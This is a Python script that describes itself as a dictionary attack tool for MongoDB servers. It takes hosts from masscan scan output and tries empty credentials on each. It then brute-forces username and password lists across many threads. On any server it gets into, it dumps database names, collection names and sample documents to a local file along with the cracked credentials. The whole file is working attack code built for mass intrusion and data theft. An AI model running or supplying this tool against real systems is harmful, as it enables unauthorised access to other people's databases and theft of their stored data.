import random
import sys
import argparse
import pymongo
import time
import re
import datetime
from concurrent.futures import ThreadPoolExecutor
from utils.fileio import save_line

hostsfile = 'mymasscanfileoutput.xml' #Replace this with your masscan or other hosts that contains mongohosts
#hostsfile = "test.txt"
# contadores de error / acierto
configuration_errors = 0
scram_auth_errors = 0
conection_failure = 0
cracked_host = 0
without_creds = 0
total_host = 0

parser = argparse.ArgumentParser(description='A dictionary attack tool for MongoDB servers.')


# funcion de comprobacion de login/comprobacion de estado de mongodb
def login_attemp(host, user, password):
    global \
        cracked_host, \
        without_creds, \
        configuration_errors, \
        conection_failure, \
        scram_auth_errors

    try:

        mongoUriString = "mongodb://" + host + "/?authSource=admin&readPreference=primary&directConnection=true&ssl=false"

        client = pymongo.MongoClient(mongoUriString, username=user, password=password)

        time_rand = random.randint(3, 8) / 10

        time.sleep(time_rand)  # Default 0.8

        databases = client.list_database_names()

        banner_status()

        if len(databases):

            print("\n")
            print("*" * 200)
            print(f"Host: {host} Usuario: {user} Contraseña: {password} Base de datos: {databases}")

            save_line("outputMongoBF.txt", f"Host: {host} Usuario: {user} Contraseña: {password}")

            for db in databases:

                documents = client[db].list_collection_names()

                for d in documents:
                    try:
                        collection = client[db].get_collection(d).find_one()
                        print(f'DB: {db} | CollectionName: {d} | CollectionContent: {collection}')
                        line = f'DB: {db} | CollectionName: {d} | CollectionContent: {collection}\n'
                        save_line("outputMongoBF.txt", line)
                    except Exception as e:
                        print(f"Error de collection {e}")
                        continue

            save_line("outputMongoBF.txt", "*" * 200)

            if user and password:
                cracked_host += 1
            else:
                without_creds += 1

            return True
        else:
            return False

    except pymongo.errors.OperationFailure as e:
        msg = e.details.get('errmsg', '')
        if e.code == 18 or e.code == 13 or 'auth fails' in msg:
            time.sleep(time_rand)
            return True
        elif e.code == 334:
            scram_auth_errors += 1
            save_line("scram-hosts.txt", host)
            return False
        else:
            print(f"auth fails {e}")
            return False
    except (pymongo.errors.ConnectionFailure) as e:
        # print("Se encontro error de conexion")
        conection_failure += 1
        save_line("conf-host-failure.txt", f"{host},{e}")

        return False
        # return False
    except pymongo.errors.ConfigurationError as e:
        configuration_errors += 1
        save_line("conf-host-configuration.txt", f"{host},{e}")
        return False
    except pymongo.errors.NetworkTimeout as e:
        print("Network Timeout" + e)
        return False
    except Exception as e:
        print("Exception:" + e)
        return False

# funcion para imprimir status del proceso
def banner_status():
    sys.stdout.write(
        f'\rServidores Crackeados: {cracked_host}| Servidores sin credenciales: {without_creds}| Errores de configuracion: {configuration_errors} | Errores de conexion: {conection_failure} | Error AuthScram {scram_auth_errors} | Total: {total_host}')
    sys.stdout.flush()


# Lectura del archivo de hosts y comprobacion de conectividad
def checkHost(host) -> bool:
    if login_attemp(host, '', ''):
        try:
            with open("users.txt") as u:
                users = u.readlines()
                with open("passwords.txt") as p:
                    passwords = p.readlines()
                    with ThreadPoolExecutor(max_workers=15) as executor_y:
                        for usuario in users:
                            for password in passwords:
                                executor_y.submit(login_attemp, host, usuario.strip(), password.strip())


        except Exception as e:
            print(f"Error general en checkHost {e}")

print(f'inicio:{datetime.datetime.now()}')

with open(hostsfile) as h:
    hosts = h.readlines()
    with ThreadPoolExecutor(max_workers=100) as executor:
        for host in hosts:
            ip = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", host.strip())

            if ip:
                try:
                    executor.submit(checkHost, ip[0])
                    total_host += 1
                except Exception as e:
                    print(e)
            else:
                continue

print(f'fin:{datetime.datetime.now()}')
